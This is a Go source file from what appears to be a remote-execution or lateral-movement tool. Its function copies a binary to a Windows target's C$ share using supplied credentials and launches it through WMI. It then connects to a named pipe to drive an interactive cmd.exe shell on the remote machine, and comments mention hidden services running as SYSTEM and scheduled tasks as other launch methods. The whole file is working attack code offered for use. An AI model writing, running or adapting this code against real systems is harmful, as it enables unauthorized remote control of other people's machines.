package main

import (
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/term"
	"io"
	"os"
	"regexp"
	"syscall"
	"time"
)

func handlePipeSession(target, user, pass, domain, name, dropmethod string) {
	// What is the approach?
	// Launch a PowerShell snippet that creates a named pipe listener on target
	// This pipe will have a cmd shell redirecting all stdout/stderr to the pipe
	// We will connect to this pipe and read/write to the cmd.exe process

	pipePath := ""
	random := getRandomString(12)
	if name == "" {
		name = random
	}
	pipePath = fmt.Sprintf(`\\%s\pipe\%s`, target, name)

	if target == "localhost" || target == "127.0.0.1" || target == "." {
		pipePath = fmt.Sprintf(`\\.\pipe\%s`, name)
	}
	// We can do a few things
	// 1. Deploy named pipe binary directly to target and start it as a hidden window via WMI
	// 2. Deploy named pipe binary to target and start as a hidden Service (optionally, as SYSTEM)
	// 3. Deploy named pipe binary to target and start as a scheduled task
	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, getRandomString(24))
	targetFile := fmt.Sprintf(`\\%s\C$\%s`, target, targetName)
	if user != "" {
		err := authenticatedCopy(user, pass, domain, target, "", pipebin, targetName, "C$")
		if err != nil {
			fmt.Printf("Failed to copy file: %v\n", err)
			return
		}
	} else {
		err := copyFile("", pipebin, targetFile)
		if err != nil {
			fmt.Printf("Failed to copy file: %v\n", err)
			return
		}
	}
	// Binary will exist at targetFile
	var err error

	if dropmethod == "wmi" {
		// Launch the named pipe binary using WMI
		// We will use the same WMI code as before, but we will pass the pipe name as an argument
		cmd := fmt.Sprintf("cmd.exe /k %s -name %s", targetFile, name)
		err = executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
		if err != nil {
			fmt.Println(err.Error())
			return
		}
	}
	time.Sleep(1 * time.Second)
	// At this point, we should assume pipe is running on target
	duration := 10 * time.Second
	conn, err := winio.DialPipe(pipePath, &duration)
	if err != nil {
		fmt.Printf("Failed to connect to pipe: %v\n", err)
		return
	}
	defer conn.Close()

	// Set local terminal to raw mode
	oldState, err := term.MakeRaw(int(syscall.Stdin))
	if err != nil {
		fmt.Printf("Failed to set terminal to raw mode: %v\n", err)
		return
	}
	defer term.Restore(int(syscall.Stdin), oldState)

	// Pipe local input -> remote shell
	go io.Copy(conn, os.Stdin)

	// Pipe remote output -> local terminal, with ANSI retained
	io.Copy(os.Stdout, conn)
}

var ansiEscape = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)

func stripANSI(input []byte) []byte {
	return ansiEscape.ReplaceAll(input, nil)
}
